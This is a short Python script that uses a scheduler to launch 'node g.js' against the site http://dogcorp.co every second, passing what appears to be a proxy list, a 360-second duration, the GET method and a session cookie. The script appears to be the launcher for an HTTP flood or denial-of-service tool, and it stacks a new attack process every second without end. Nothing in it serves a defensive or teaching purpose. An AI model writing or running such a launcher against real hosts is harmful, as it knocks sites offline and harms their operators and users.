import schedule
import time
import os
import sys

os.system('node g.js http://dogcorp.co all.txt 360 GET PHPSESSID:ohq0tcrvhgfuo6ljh8mn20ndu7')

def job():
    os.system('node g.js http://dogcorp.co all.txt 360 GET PHPSESSID:ohq0tcrvhgfuo6ljh8mn20ndu7')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)
